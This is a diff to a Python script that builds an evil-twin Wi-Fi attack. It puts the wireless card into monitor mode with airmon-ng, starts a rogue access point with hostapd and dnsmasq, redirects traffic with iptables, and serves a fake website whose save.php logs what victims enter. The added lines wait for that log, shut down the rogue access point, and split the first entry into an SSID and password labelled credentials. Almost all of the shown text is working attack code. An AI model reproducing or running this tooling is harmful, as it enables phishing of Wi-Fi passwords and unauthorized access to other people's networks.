@@ -3,6 +3,7 @@ import csv
 from threading import Timer
 from os import system
 import time
+from os import path
 
 subprocess.call(['rm', 'output-01.csv'])
 subprocess.call(['airmon-ng', 'start', 'wlan0'])
@@ -67,7 +68,7 @@ subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-p', 'tcp', '--dp
 subprocess.call(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-j', 'MASQUERADE'])
 #subprocess.call(['iptables', '-t', 'nat', '-A', 'POSTROUTING', '-p', 'tcp', '-d', '192.168.1.125', '--dport', '80', '-j', 'SNAT', '--to-source', '192.168.1.1'])
 
-subprocess.Popen(['hostapd', 'hostapd.conf'])
+proc1 = subprocess.Popen(['hostapd', 'hostapd.conf'])
 
 subprocess.call(['rm', 'dnsmasq.conf'])
 
@@ -81,7 +82,7 @@ with open('dnsmasq.conf', 'w') as f:
     f.write('log-dhcp\n')
     f.write('listen-address=127.0.0.1\n')
 
-subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf', '-d'])
+proc2 = subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf', '-d'])
 
 # Move Fake website into the directory that Apache hosts
 subprocess.call(['cp', './website/index.html', '/var/www/html/'])
@@ -110,3 +111,17 @@ with open('./website/save.php', 'w') as f:
     f.write('ob_end_flush();\n')
     f.write('?>\n')
 
+# Sleep until log.txt is written to
+while (path.getsize('/var/www/html/log.txt') == 0):
+   time.sleep(3)
+
+# Kill hostapd and dnsmasq background processes
+proc1.kill()
+proc2.kill()
+
+f = open('/var/www/html/log.txt', 'r')
+# Get first line. Remove possible newlines from end
+line = f.readline().strip('\n')
+credentials = line.split(':')
+#print('ssid: ' + credentials[0] + '\n')
+#print('pw: ' + credentials[1])
